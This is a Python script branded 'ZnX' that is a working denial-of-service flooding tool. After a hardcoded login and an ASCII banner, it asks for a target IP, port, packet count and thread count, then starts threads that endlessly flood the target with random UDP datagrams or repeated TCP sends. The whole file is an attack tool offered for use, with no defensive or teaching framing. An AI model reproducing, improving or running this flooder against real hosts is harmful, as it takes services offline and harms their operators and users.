import random
import socket
import threading


print("\u001b[35m Welcome to ZnX ")

print("Loading.......")


# Login Administrators      

attemps = 0

while attemps < 100:
    username = input('👾Enter your username: ')
    password = input('🔒Enter your password: ')

    if username == 'znx' and password == 'admin':
        print('You have successfully logged in Welcome to ZnX')
        break
    else:
        print('Incorrect credentials. Check if you have Caps lock on and try again.')
        attemps += 1
        continue






print("\033[95m")
print("""
▒███████▒ ███▄    █ ▒██   ██▒
▒ ▒ ▒ ▄▀░ ██ ▀█   █ ▒▒ █ █ ▒░
░ ▒ ▄▀▒░ ▓██  ▀█ ██▒░░  █   ░
  ▄▀▒   ░▓██▒  ▐▌██▒ ░ █ █ ▒ 
▒███████▒▒██░   ▓██░▒██▒ ▒██▒
░▒▒ ▓░▒░▒░ ▒░   ▒ ▒ ▒▒ ░ ░▓ ░
░░▒ ▒ ░ ▒░ ░░   ░ ▒░░░   ░▒ ░
░ ░ ░ ░ ░   ░   ░ ░  ░    ░  
  ░ ░             ░  ░    ░  
░                            

╔══════════════════════╦══════════════════════╗
║  Project Version.0.1	   Admin: znx.teiv	  ║
╚═══════════════════════╩═════════════════════╝
""")
print("\033[95m")
ip= str(input(" Target IP :"))
port= int(input(" Port :"))
times= int(input(" Paket :"))
threads= int(input(" Threads :"))
choice = str(input(" Ban co muon su dung send attack ? (Y/N):"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[Z]","[N]","[X]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" Send Attak To IP Andreas"+ ip)
		except:
			print("[ZNX] Time out")

def run2():
	data = random._urandom(16)
	i = random.choice(("[Z]","[N]","[X]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Send Attak To IP Andreas"+ ip)
		except:
			s.close()
			print("[ZNX] Time out")
            
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
